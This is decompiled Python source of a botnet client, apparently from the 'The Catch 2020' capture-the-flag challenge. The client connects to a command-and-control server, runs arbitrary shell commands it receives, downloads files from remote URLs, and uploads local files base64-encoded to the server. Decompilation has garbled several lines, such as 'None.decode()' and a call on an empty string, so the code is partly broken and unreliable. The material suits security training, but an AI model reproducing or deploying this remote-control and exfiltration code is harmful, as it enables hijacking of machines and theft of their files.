# Source Generated with Decompyle++
# File: botnet_client.pyc (Python 3.5)

'''
The Catch 2020 - Botnet client for "The Connection"
'''
import os
import sys
import codecs
import subprocess
import argparse
import base64
import socket
import string
import struct
import random
from time import sleep
import platform
import requests
from getmac import get_mac_address
__author__ = 'Ale\xc5\xa1 Padrta @ CESNET.CZ'
__version__ = '1.0'

class Message:
    '''
\tBotnet message
\t'''
    plain = ''
    encoded = ''
    sckbuffer = bytearray()
    
    def __init__(self):
        '''
\t\tConstructor
\t\t'''
        self.plain = ''
        self.encoded = ''
        self.sckbuffer = bytearray()

    
    def set_plain(self, msg):
        '''
\t\tInitialize with decoded (plain) message
\t\t'''
        self.plain = msg
        self.encode_msg()

    
    def get_plain(self):
        '''
\t\tReturn decoded (plain) message
\t\t'''
        return self.plain

    
    def set_encoded(self, msg):
        '''
\t\tInitialize with encoded message (debug purposes)
\t\t'''
        self.encoded = msg
        self.decode_msg()

    
    def get_encoded(self):
        '''
\t\tReturn encoded message (debug purposes)
\t\t'''
        return self.encoded

    
    def encode_msg(self):
        '''
\t\tEncode plain message
\t\t'''
        basemsg = self.plain.encode()
        prefix = struct.pack('>Q', len(basemsg))
        self.encoded = prefix + basemsg

    
    def decode_msg(self):
        '''
\t\tDecode plain message
\t\t'''
        prefix = struct.unpack('>Q', self.encoded[0:8])[0]
        basemsg = self.encoded[8:]
        if len(basemsg) != prefix:
            self.plain = ''
            raise Exception('Inconsistence in message')
        self.plain = None.decode()

    
    def send_msg(self, sck):
        '''
\t\tSend encoded message to socket
\t\t'''
        
        try:
            sck.sendall(self.encoded)
        except Exception:
            exc = None
            
            try:
                raise 
            finally:
                exc = None
                del exc



    
    def receive_msg(self, sck):
        '''
\t\tReceive encoded message from socket
\t\t'''
        
        try:
            raw_msglen = self.receive_all(sck, 8)
            if not raw_msglen:
                return None
            msglen = None.unpack('>Q', raw_msglen)[0]
            data = self.receive_all(sck, msglen)
            self.encoded = raw_msglen + data
            self.decode_msg()
            return len(self.encoded)
        except Exception:
            return None


    
    def receive_all(self, sck, length):
        '''
\t\tReceive specified number of bytes (or return None if EOF is hit)
\t\t'''
        self.sckbuffer = bytearray()
        while len(self.sckbuffer) < length:
            packet = sck.recv(length - len(self.sckbuffer))
            if not packet:
                return None
            None.sckbuffer.extend(packet)
        return self.sckbuffer



class BotnetClient:
    '''
\tClass for FT2-BotnetClient
\t'''
    client_id = None
    server_ip = ''
    time_out = 5
    server_port = 0
    beacon = 5
    stop = False
    nextmsg = None
    nexttype = None
    sck = None
    
    def __init__(self, srv_ip, srv_port):
        '''
\t\tConstructor
\t\t'''
        self.server_ip = srv_ip
        self.server_port = srv_port
        self.generate_id()
        self.beacon = 1
        self.stop = False
        self.time_out = 5
        self.nextmsg = None
        self.nexttype = None
        self.sck = None

    
    def generate_id(self):
        '''
\t\tGenerate client ID
\t\t'''
        self.client_id = '{}'.format(''.join(random.sample(string.ascii_lowercase + string.digits, k = 16)))

    
    def generate_readymsg(self):
        '''
\t\tGenerate ready message
\t\t'''
        return '{};;ready'.format(self.client_id)

    
    def get_order(self):
        '''
\t\tBeacon and get order from server
\t\t'''
        msg = Message()
        msg.set_plain(self.generate_readymsg())
        msg.send_msg(self.sck)
        msg.set_plain('')
        msg.receive_msg(self.sck)
        details = ''
        order = ''
        if msg.get_plain().count(';;') < 1:
            order = msg.get_plain()
        else:
            (order, details) = msg.get_plain().split(';', 1)
        return (order, details)

    
    def order_execute(self, details):
        '''
\t\tPerformning command "execute"
\t\t'''
        out = None
        err = None
        
        try:
            proc = subprocess.Popen(details.split(';'), stdout = subprocess.PIPE, shell = True)
            (out, err) = proc.communicate()
        except Exception:
            pass

        if os.device_encoding(0):
            if out:
                pass
            if err:
                pass
            self.nextmsg = ''(err.decode(os.device_encoding(0)), 1, '')
        elif out:
            pass
        
        if err:
            pass
        self.nextmsg = ''(err.decode(), 1, '')
        self.nexttype = 'result-execution'

    
    def order_download(self, details):
        '''
\t\tPerformning command "download"
\t\t'''
        (download_file, download_url) = details.split(';;', 1)
        response = None
        
        try:
            response = requests.get(download_url)
        except Exception:
            pass

        if response and response.status_code == 200:
            download_fileh = open(download_file, 'wb')
            download_fileh.write(response.content)
            download_fileh.close()
            self.nextmsg = '{};;info;;download-ok;;{} -> {}'.format(self.client_id, download_url, download_file)
        else:
            self.nextmsg = '{};;info;download-failed;;{}'.format(self.client_id, download_url)
        self.nexttype = 'info'

    
    def order_upload(self, details):
        '''
\t\tPerformning command "upload"
\t\t'''
        upload_content = None
        
        try:
            fup = codecs.open(details, 'rb')
            upload_content = base64.b64encode(fup.read()).decode()
            fup.close()
        except Exception:
            pass

        if upload_content:
            self.nextmsg = '{};;file-upload;;{};;{}'.format(self.client_id, details, upload_content)
            self.nexttype = 'file-upload'
        else:
            self.nextmsg = '{};;info;;upload-failed;;{}'.format(self.client_id, details)
            self.nexttype = 'info'

    
    def sent_data(self):
        '''
\t\tSending data prepared by performing previous order
\t\t'''
        msg = Message()
        msg.set_plain(self.nextmsg)
        print('-> Sending data ({})'.format(self.nexttype))
        msg.send_msg(self.sck)
        if self.nexttype in ('result-execution', 'file-upload'):
            msg.set_plain('')
            msg.receive_msg(self.sck)
            print('<- Server reply: {}'.format(msg.get_plain()))
        self.nextmsg = None
        self.nexttype = None

    
    def run(self):
        '''
\t\tRunning the botnet client
\t\t'''
        msg = Message()
        print('The Catch 2020 Botnet Client started (server on {} port {})'.format(self.server_ip, self.server_port))
        while not self.stop:
            
            try:
                self.sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sck.settimeout(self.time_out)
                self.sck.connect((self.server_ip, self.server_port))
            except socket.error:
                excdesc = None
                
                try:
                    print('Connection failed: {}'.format(excdesc))
                finally:
                    excdesc = None
                    del excdesc


            
            try:
                if not self.nextmsg:
                    (order, details) = self.get_order()
                    if order == 'wait':
                        self.beacon = int(details)
                    elif order == 'client-stop':
                        self.stop = True
                        self.sck.close()
                    elif order == 'execute':
                        self.order_execute(details)
                    elif order == 'download':
                        self.order_download(details)
                    elif order == 'upload':
                        self.order_upload(details)
                    else:
                        print('Received unknown order')
                else:
                    self.sent_data()
                self.sck.close()
            except Exception:
                pass

            if not self.stop:
                sleep(self.beacon)
                self.beacon = self.beacon * 2.2
            self.logfile.log_entry('The Catch 2020 Botnet Clien stopped', 'info')
            self.logfile.close()
            return None



def get_args():
    '''
\tCmd line argument parsing (preprocessing)
\t'''
    parser = argparse.ArgumentParser(description = 'The Catch 2020 Botnet Client')
    parser.add_argument('-ip', '--ipaddress', type = str, help = 'Server IP address', required = True)
    parser.add_argument('-p', '--port', type = int, help = 'Server port', required = True)
    args = parser.parse_args()
    return (args.ipaddress, args.port)


def main():
    '''
\tMain function
\t'''
    if sys.version_info[0] < 3:
        print('ERROR: Python3 required.')
        exit(1)
    (srv_ip, srv_port) = get_args()
    client = BotnetClient(srv_ip, srv_port)
    client.run()

main()
